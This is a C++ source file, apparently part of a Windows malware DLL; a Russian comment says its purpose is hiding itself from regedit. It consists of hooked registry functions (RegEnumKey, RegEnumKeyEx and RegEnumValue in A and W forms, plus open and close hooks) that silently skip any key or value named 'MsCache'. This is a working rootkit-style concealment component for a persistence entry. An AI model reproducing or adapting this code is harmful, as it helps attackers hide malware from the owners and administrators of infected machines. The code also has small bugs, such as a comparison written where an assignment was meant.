
#include "Mydll.h"

#define MAX_REG 1024

HKEY reg_fakes[MAX_REG];
int reg_num[MAX_REG];

const char *reg_hide[] = { "MsCache", NULL };


/********************************************************************************
		
		Прячем себя от regedit-a

/*******************************************************************************/


void reg_filter_init ()
	{
		for (int n=0; n<MAX_REG;n++)
		{
		reg_fakes[n] == 0;
		reg_num[n] = 0;
		}
	}

//фильтровать ли val?
BOOL reg_filter ( LPWSTR val )
	{
	LPWSTR tmp = (LPWSTR)malloc(8129);
	int idx = 0;
	while ( reg_hide[idx] )
		{
		int r = MultiByteToWideChar(CP_ACP, 0, reg_hide[idx], -1, tmp, 8192);
		if ( StrCmpIW ( val, tmp ) == 0 )
			{
			free(tmp);
			return TRUE;
			}
		idx++;
		}
	free(tmp);
	return FALSE;
	}

BOOL reg_filterA ( LPSTR val )
	{
	int idx = 0;
	while ( reg_hide[idx] )
		{
		if ( StrCmpIA ( val, reg_hide[idx] ) == 0 )
			{
			return TRUE;
			}
		idx++;
		}
	return FALSE;
	}


int reg_find_fake ( HKEY h )
	{
	int idx = 0;
	while ( (reg_fakes[idx] != h ) && (idx<MAX_REG) ) idx++;
	if ( idx == MAX_REG )
		{
		idx = 0;
		while ( reg_fakes[idx] != 0 ) idx++;
		}
	return idx;
	}


LONG WINAPI cRegEnumKeyA (
    IN HKEY hKey,
    IN DWORD dwIndex,
    OUT LPSTR lpName,
    IN DWORD cbName
    )
	{
	LONG res = 0;
	int idx = reg_find_fake ( hKey );
	int skipped = reg_num[idx];
	do
		{
		res = RegEnumKeyA ( hKey, dwIndex+skipped, lpName, cbName);
		skipped++;
		}
	while ( (res == 0 ) && (reg_filterA(lpName) == TRUE) );
	skipped--;
	if ( res != 0 )
		return res;
	if ( skipped > 0 )
		{
		//запишем
		reg_fakes[idx] = hKey;
		reg_num[idx] = skipped;
		}
	return res;
	}

LONG WINAPI cRegEnumKeyExA (
    IN HKEY hKey,
    IN DWORD dwIndex,
    OUT LPSTR lpName,
    IN OUT LPDWORD lpcbName,
    IN LPDWORD lpReserved,
    IN OUT LPSTR lpClass,
    IN OUT LPDWORD lpcbClass,
    OUT PFILETIME lpftLastWriteTime
    )
	{
	LONG res = 0;
	int idx = reg_find_fake ( hKey );
	int skipped = reg_num[idx];
	do
		{
		res = RegEnumKeyExA ( hKey, dwIndex+skipped, lpName, lpcbName, lpReserved, 
													lpClass, lpcbClass, lpftLastWriteTime );
		skipped++;
		}
	while ( (res == 0 ) && (reg_filterA(lpName) == TRUE) );
	skipped--;
	if ( res != 0 )
		return res;
	if ( skipped > 0 )
		{
		//запишем
		reg_fakes[idx] = hKey;
		reg_num[idx] = skipped;
		}
	return res;
	}

LONG WINAPI cRegEnumKeyW (
    IN HKEY hKey,
    IN DWORD dwIndex,
    OUT LPWSTR lpName,
    IN DWORD cbName
    )
	{
	LONG res = 0;
	int idx = reg_find_fake ( hKey );
	int skipped = reg_num[idx];
	do
		{
		res = RegEnumKeyW ( hKey, dwIndex+skipped, lpName, cbName );
		skipped++;
		}
	while ( (res == 0 ) && (reg_filter(lpName) == TRUE) );
	skipped--;
	if ( res != 0 )
		return res;
	if ( skipped > 0 )
		{
		//запишем
		reg_fakes[idx] = hKey;
		reg_num[idx] = skipped;
		}
	return res;
	}


LONG WINAPI cRegEnumKeyExW (
    IN HKEY hKey,
    IN DWORD dwIndex,
    OUT LPWSTR lpName,
    IN OUT LPDWORD lpcbName,
    IN LPDWORD lpReserved,
    IN OUT LPWSTR lpClass,
    IN OUT LPDWORD lpcbClass,
    OUT PFILETIME lpftLastWriteTime
    )
	{
	LONG res = 0;
	int idx = reg_find_fake ( hKey );
	int skipped = reg_num[idx];
	do
		{
		res = RegEnumKeyExW ( hKey, dwIndex+skipped, lpName, lpcbName, lpReserved, 
													lpClass, lpcbClass, lpftLastWriteTime );
		skipped++;
		}
	while ( (res == 0 ) && (reg_filter(lpName) == TRUE) );
	skipped--;
	if ( res != 0 )
		return res;
	if ( skipped > 0 )
		{
		//запишем
		reg_fakes[idx] = hKey;
		reg_num[idx] = skipped;
		}
	return res;
	}

LONG WINAPI cRegEnumValueA (
    IN HKEY hKey,
    IN DWORD dwIndex,
    OUT LPSTR lpValueName,
    IN OUT LPDWORD lpcbValueName,
    IN LPDWORD lpReserved,
    OUT LPDWORD lpType,
    OUT LPBYTE lpData,
    IN OUT LPDWORD lpcbData
    )
	{
	LONG res = 0;
	int idx = reg_find_fake ( hKey );
	int skipped = reg_num[idx];
	do
		{
		res = RegEnumValueA ( hKey, dwIndex+skipped, lpValueName, lpcbValueName, lpReserved, lpType, lpData, lpcbData );
		skipped++;
		}
	while ( (res == 0 ) && (reg_filterA(lpValueName) == TRUE) );
	skipped--;
	if ( res != 0 )
		return res;
	if ( skipped > 0 )
		{
		//запишем
		reg_fakes[idx] = hKey;
		reg_num[idx] = skipped;
		}
	return res;
	
	}



LONG WINAPI cRegEnumValueW (
    IN HKEY hKey,
    IN DWORD dwIndex,
    OUT LPWSTR lpValueName,
    IN OUT LPDWORD lpcbValueName,
    IN LPDWORD lpReserved,
    OUT LPDWORD lpType,
    OUT LPBYTE lpData,
    IN OUT LPDWORD lpcbData
    )
	{
	LONG res = 0;
	int idx = reg_find_fake ( hKey );
	int skipped = reg_num[idx];
	do
		{
		res = RegEnumValueW ( hKey, dwIndex+skipped, lpValueName, lpcbValueName, lpReserved, lpType, lpData, lpcbData );
		skipped++;
		}
	while ( (res == 0 ) && (reg_filter(lpValueName) == TRUE) );
	skipped--;
	if ( res != 0 )
		return res;
	if ( skipped > 0 )
		{
		//запишем
		reg_fakes[idx] = hKey;
		reg_num[idx] = skipped;
		}
	return res;
	}

LONG WINAPI cRegOpenKeyExW (
    IN HKEY hKey,
    IN LPCWSTR lpSubKey,
    IN DWORD ulOptions,
    IN REGSAM samDesired,
    OUT PHKEY phkResult
    )
	{
	LONG res = RegOpenKeyExW ( hKey, lpSubKey, ulOptions, samDesired, phkResult );
	for ( int n = 0; n<MAX_REG; n++ )
		if ( reg_fakes[n] == *phkResult )
			{
			reg_fakes[n] = 0;
			reg_num[n] = 0;
			return res;
			}
	return res;
	}

LONG WINAPI cRegOpenKeyA (
    IN HKEY hKey,
    IN LPCSTR lpSubKey,
    OUT PHKEY phkResult
    )
	{
	LONG res = RegOpenKeyA ( hKey, lpSubKey, phkResult );
	for ( int n = 0; n<MAX_REG; n++ )
		if ( reg_fakes[n] == *phkResult )
			{
			reg_fakes[n] = 0;
			reg_num[n] = 0;
			return res;
			}
	return res;
	}

LONG WINAPI cRegOpenKeyW (
    IN HKEY hKey,
    IN LPCWSTR lpSubKey,
    OUT PHKEY phkResult
    )
	{
	LONG res = RegOpenKeyW ( hKey, lpSubKey, phkResult );
	for ( int n = 0; n<MAX_REG; n++ )
		if ( reg_fakes[n] == *phkResult )
			{
			reg_fakes[n] = 0;
			reg_num[n] = 0;
			return res;
			}
	return res;
	}

LONG WINAPI cRegCloseKey (
    IN HKEY hKey
    )
	{
	for ( int n=0; n<MAX_REG;n++)
		if ( reg_fakes[n] == hKey )
			{
			reg_fakes[n] = 0;
			reg_num[n] = 0;
			};
  return RegCloseKey ( hKey );
	}
